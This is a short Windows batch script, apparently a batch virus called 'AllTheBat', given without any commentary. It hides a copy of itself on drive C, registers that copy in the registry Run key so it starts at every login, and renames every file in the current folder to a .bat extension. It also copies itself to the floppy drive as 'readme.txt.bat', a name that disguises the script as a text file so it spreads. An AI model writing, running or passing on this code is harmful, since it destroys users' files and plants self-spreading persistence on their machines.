@echo off
if exist %windir%\1.sys goto 2
if not exist %windir%\1.sys goto 1
:1
echo AllTheBat >>%windir%\1.sys
copy %0 c:\AllTheBat.bat >nul
@attrib +h +s c:\AllTheBat.bat >nul
echo REGEDIT4>C:\AllTheBat.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]>>C:\AllTheBat.reg
echo "AllTheBat"="c:\\AllTheBat.bat" >> C:\AllTheBat.reg
regedit /s C:\AllTheBat.reg
del C:\AllTheBat.reg >nul
:2
echo project AllTheBat >>%windir%\info.txt
for %%v in (*.*) do ren *.* *.bat
copy %0 A:\readme.txt.bat >nul
ctty con
cls

